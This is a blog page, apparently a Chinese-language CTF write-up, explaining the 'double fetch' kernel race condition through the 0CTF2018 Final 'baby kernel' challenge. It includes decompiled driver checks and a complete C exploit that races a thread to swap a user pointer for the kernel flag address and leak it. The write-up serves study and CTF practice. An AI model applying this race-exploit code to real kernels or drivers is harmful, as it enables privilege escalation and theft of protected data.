@@ -1,0 +1,496 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>double fetch | X1NRI</title>
+  <meta name="author" content="X1NRI">
+  
+  <meta name="description" content="初探内核态条件竞争">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="double fetch"/>
+  <meta property="og:site_name" content="X1NRI"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="X1NRI" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">X1NRI</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/links" title="Subscribe me.">
+			  <i class="fa fa-chain"></i>Links
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> double fetch</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> 初探内核态条件竞争
+		 </div> <!-- alert -->
+	  		
+
+	  <blockquote>
+<p>通常情况下在用户态下的 pwn 当中我们只有一个独立运行的主线程，并不存在所谓条件竞争的情况，但在 kernel pwn 当中由攻击者负责编写用户态程序，可以很轻易地启动多个线程同时运行，从而轻易地产生条件竞争。<a target="_blank" rel="noopener" href="https://www.usenix.org/system/files/conference/usenixsecurity17/sec17-wang.pdf">原论文</a><br>参考文章：<a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/race/double-fetch/">Double Fetch - CTF Wiki (ctf-wiki.org)</a><br><a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#double-fetch">【PWN.0x00】Linux Kernel Pwn I：Basic Exploit to Kernel Pwn in CTF - arttnba3’s blog</a></p>
+</blockquote>
+<h1 id="一、原理"><a href="#一、原理" class="headerlink" title="一、原理"></a>一、原理</h1><p><code>Double Fetch</code> 从漏洞原理上属于条件竞争漏洞，是一种内核态与用户态之间的数据访问竞争。</p>
+<p>在 Linux 等现代操作系统中，虚拟内存地址通常被划分为内核空间和用户空间。内核空间负责运行内核代码、驱动模块代码等，权限较高。而用户空间运行用户代码，并通过系统调用进入内核完成相关功能。通常情况下，用户空间向内核传递数据时，内核先通过通过 <code>copy_from_user</code> 等拷贝函数将用户数据拷贝至内核空间进行校验及相关处理，<strong>但在输入数据较为复杂时，内核可能只引用其指针，而将数据暂时保存在用户空间进行后续处理。此时，该数据存在被其他恶意线程篡改风险，造成内核验证通过数据与实际使用数据不一致，导致内核代码执行异常。</strong></p>
+<p>一个典型的 <code>Double Fetch</code> 漏洞原理如下图所示，一个用户态线程准备数据并通过系统调用进入内核，该数据在内核中有两次被取用，内核第一次取用数据进行安全检查（如缓冲区大小、指针可用性等），当检查通过后内核第二次取用数据进行实际处理。而在两次取用数据之间，另一个用户态线程可创造条件竞争，对已通过检查的用户态数据进行篡改，在真实使用时造成访问越界或缓冲区溢出，最终导致内核崩溃或权限提升。</p>
+<p><img src="/Binary_FILE/6d85660472c166f79b1b5e7cfd817980_MD5.jpeg"></p>
+<p>通过在 first fetch 与 second fetch 之间的空挡修改数据从而改变内核执行流的利用手法便被称之为<code>double fetch</code></p>
+<h1 id="二、0CTF2018-Final-baby-kernel"><a href="#二、0CTF2018-Final-baby-kernel" class="headerlink" title="二、0CTF2018 Final - baby kernel"></a>二、0CTF2018 Final - baby kernel</h1><h2 id="一-程序分析"><a href="#一-程序分析" class="headerlink" title="(一)程序分析"></a>(一)程序分析</h2><h2 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">qemu-system-x86_64 <span class="token punctuation">\</span>
+<span class="token parameter variable">-m</span> 256M <span class="token parameter variable">-smp</span> <span class="token number">2</span>,cores<span class="token operator">=</span><span class="token number">2</span>,threads<span class="token operator">=</span><span class="token number">1</span>  <span class="token punctuation">\</span>
+<span class="token parameter variable">-kernel</span> ./vmlinuz-4.15.0-22-generic <span class="token punctuation">\</span>
+<span class="token parameter variable">-initrd</span>  ./core.cpio <span class="token punctuation">\</span>
+<span class="token parameter variable">-append</span> <span class="token string">"root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet"</span> <span class="token punctuation">\</span>
+<span class="token parameter variable">-cpu</span> qemu64 <span class="token punctuation">\</span>
+<span class="token parameter variable">-netdev</span> user,id<span class="token operator">=</span>t0, <span class="token parameter variable">-device</span> e1000,netdev<span class="token operator">=</span>t0,id<span class="token operator">=</span>nic0 <span class="token punctuation">\</span>
+<span class="token parameter variable">-nographic</span>  -enable-kvm  <span class="token punctuation">\</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>基本没开什么保护</p>
+<h2 id="core-init"><a href="#core-init" class="headerlink" title="&#x2F;core&#x2F;init"></a>&#x2F;core&#x2F;init</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
+ 
+<span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc
+<span class="token function">mount</span> <span class="token parameter variable">-t</span> sysfs none /sys
+<span class="token function">mount</span> <span class="token parameter variable">-t</span> devtmpfs devtmpfs /dev
+<span class="token builtin class-name">echo</span> <span class="token string">"flag&#123;this_is_a_sample_flag&#125;"</span> <span class="token operator">></span> flag
+<span class="token function">chown</span> root:root flag
+<span class="token function">chmod</span> <span class="token number">400</span> flag
+<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/dev/console
+<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/console
+<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/console
+
+insmod baby.ko
+<span class="token function">chmod</span> <span class="token number">777</span> /dev/baby
+<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span>
+setsid cttyhack setuidgid <span class="token number">1000</span> <span class="token function">sh</span>
+
+<span class="token function">umount</span> /proc
+<span class="token function">umount</span> /sys
+poweroff <span class="token parameter variable">-d</span> <span class="token number">0</span>  <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>在&#x2F;dev&#x2F;baby有一个驱动</p>
+<h2 id="baby-ko"><a href="#baby-ko" class="headerlink" title="baby.ko"></a>baby.ko</h2><p><img src="/Binary_FILE/86c4412a35b01465833c8740c52858c2_MD5.jpeg"></p>
+<h3 id="init-module"><a href="#init-module" class="headerlink" title="init_module"></a>init_module</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">init_module</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 a2<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+  <span class="token function">_fentry__</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token function">misc_register</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>baby<span class="token punctuation">)</span><span class="token punctuation">;</span>
+  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>创建了一个驱动baby</p>
+<h3 id="baby-ioctl"><a href="#baby-ioctl" class="headerlink" title="baby_ioctl"></a>baby_ioctl</h3><p><img src="/Binary_FILE/eadf383cf8e6cae625207e66cd8edf2d_MD5.jpeg"><br>不难看出我们传入的结构体为：</p>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">v5</span><span class="token punctuation">&#123;</span>
+	<span class="token keyword">char</span> <span class="token operator">*</span>flag<span class="token punctuation">;</span>
+	<span class="token class-name">size_t</span> len<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>其中参数 <code>0x6666</code> 可以获得 flag 在内核中的地址，参数 <code>0x1337</code> 则会将我们传入的 flag 与真正的 flag 进行对比，若正确则会将 flag 打印出来<br><img src="/Binary_FILE/eebcbda8ae5b6b515c20e3017fafb6b5_MD5.jpeg"></p>
+<p>主要看打印flag的这个检查，需要<code>_chk_range_not_ok()</code>函数返回值为0：<br><img src="/Binary_FILE/59f16cbe8aad4e8fd08af279bdf46247_MD5.jpeg"></p>
+<p>其中<code>_chk_range_not_ok()</code>如下<br><img src="/Binary_FILE/e097bac6f5c642a14e4b8c5f77a7cb57_MD5.jpeg"></p>
+<ul>
+<li>CF是进位标志，如果运算结果的<strong>最高位</strong>产生了一个进位或错位，那么，其值为1，否则其值为0。在这里我们一般满足</li>
+<li>a3要求小于a1+a2，这个a3是<code>*(__readgsqword(&amp;current_task) + 0x1358)</code>。切root动调看：<br><img src="/Binary_FILE/b805321a5fcf6e3effc02f924b2707f9_MD5.jpeg"><br>可见该值为0x7ffffffff000，正好是用户态的栈底值<br><img src="/Binary_FILE/b240eb23c9676449cc306e4f05fd6dfa_MD5.jpeg"></li>
+</ul>
+<p>综上所述，检查为：</p>
+<ol>
+<li>输入的数据指针是否为用户态数据</li>
+<li>数据指针内的成员flag指针是否指向用户态</li>
+<li>指针指向数据的len是否对于flag长度</li>
+</ol>
+<h2 id="二-EXP"><a href="#二-EXP" class="headerlink" title="(二)EXP"></a>(二)EXP</h2><p>这个驱动似乎没有什么漏洞，但是其中的两个检查是分开的<br><img src="/Binary_FILE/9dd93c0fa6f031532ec84d6e1b89e70b_MD5.jpeg"><br>如果我们在判断flag地址范围和flag内容之间进行竞争，通过第一处检查后就把flag的地址换为内核中真正flag的地址，然后自身与自身比较，通过检查拿到flag。</p>
+<p>攻击思路：</p>
+<ol>
+<li>创建一个竞争线程，不断修改flag.flag_addr为内核flag地址</li>
+<li>循环执行ioctl（事前改flag.flag_addr为用户态地址）</li>
+</ol>
+<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;pthread.h></span></span>
+
+<span class="token comment">/*
+user_cs;
+user_rflags;
+user_sp;
+user_ss;
+*/</span>
+<span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_sp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span>
+<span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	__asm__ <span class="token function">__volatile__</span><span class="token punctuation">(</span>
+		<span class="token string">"mov user_cs,cs;"</span>
+		<span class="token string">"mov user_ss,ss;"</span>
+		<span class="token string">"mov user_sp,rsp;"</span>
+		<span class="token string">"pushf;"</span>		
+		<span class="token string">"pop user_rflags;"</span>	    			
+	<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[+] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token keyword">else</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>
+	<span class="token keyword">char</span> <span class="token operator">*</span>flag_addr<span class="token punctuation">;</span>
+	<span class="token class-name">size_t</span> flag_len<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>flag<span class="token punctuation">;</span>
+
+<span class="token keyword">int</span> status<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>
+<span class="token class-name">pthread_t</span> compete_thread<span class="token punctuation">;</span>
+<span class="token keyword">void</span> <span class="token function">competitionThread</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>addr<span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token keyword">while</span> <span class="token punctuation">(</span>status<span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		flag<span class="token punctuation">.</span>flag_addr<span class="token operator">=</span>addr<span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	
+	<span class="token keyword">int</span> fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/baby"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> 
+	<span class="token punctuation">&#123;</span>
+		<span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to open /dev/baby"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+	<span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0x6666</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"dmesg |grep flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"dmesg |grep flag > ./addr.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token comment">//get addr</span>
+	<span class="token keyword">int</span> addr_fd<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"./addr.txt"</span><span class="token punctuation">,</span>O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span> <span class="token punctuation">(</span>addr_fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span> 
+	<span class="token punctuation">&#123;</span>
+		<span class="token function">errExit</span><span class="token punctuation">(</span><span class="token string">"failed to open /dev/baby"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>	
+	<span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x60</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+	<span class="token keyword">char</span><span class="token operator">*</span> real_addr<span class="token punctuation">;</span>
+
+	<span class="token function">read</span><span class="token punctuation">(</span>addr_fd<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	real_addr<span class="token operator">=</span><span class="token function">strstr</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span><span class="token string">"ff"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	real_addr<span class="token operator">=</span><span class="token function">strtoul</span><span class="token punctuation">(</span>real_addr<span class="token punctuation">,</span>real_addr<span class="token operator">+</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+]real_addr: %p\n"</span><span class="token punctuation">,</span> real_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token comment">//competition</span>
+	<span class="token function">pthread_create</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>compete_thread<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> competitionThread <span class="token punctuation">,</span>real_addr<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">int</span> try_times<span class="token operator">=</span><span class="token number">0x1000</span><span class="token punctuation">;</span>
+
+	flag<span class="token punctuation">.</span>flag_len<span class="token operator">=</span><span class="token number">33</span><span class="token punctuation">;</span>
+	<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;=</span>try_times<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>	
+		flag<span class="token punctuation">.</span>flag_addr<span class="token operator">=</span><span class="token string">"X1NRI"</span><span class="token punctuation">;</span>
+		<span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> <span class="token number">0x1337</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	status<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>
+	<span class="token function">pthread_cancel</span><span class="token punctuation">(</span>compete_thread<span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"dmesg |grep flag&#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p><img src="/Binary_FILE/bf3135c1609351382f4aa65ddebf4bc3_MD5.jpeg"></p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2023/12/24/double%20fetch/" class="leancloud-visitors view" data-flag-title="double fetch">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2023/12/29/2023-线上-第六届安洵杯/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/12/11/DASCTF X 0psu3 2023十一月挑战赛/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"QrmzEeS3e4xvmJxO1dSPlkW4-gzGzoHsz","appKey":"ov6uvwKnDQmJxtpeS0wvBIwL","placeholder":"","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-12-24 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Linux-Kernel-Mode/">Linux Kernel Mode<span>8</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%B8%80%E3%80%81%E5%8E%9F%E7%90%86"><span class="toc-article-text">一、原理</span></a></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#%E4%BA%8C%E3%80%810CTF2018-Final-baby-kernel"><span class="toc-article-text">二、0CTF2018 Final - baby kernel</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%B8%80-%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-article-text">(一)程序分析</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#start-sh"><span class="toc-article-text">start.sh</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#core-init"><span class="toc-article-text">&#x2F;core&#x2F;init</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#baby-ko"><span class="toc-article-text">baby.ko</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#init-module"><span class="toc-article-text">init_module</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#baby-ioctl"><span class="toc-article-text">baby_ioctl</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E4%BA%8C-EXP"><span class="toc-article-text">(二)EXP</span></a></li></ol></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 X1NRI's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
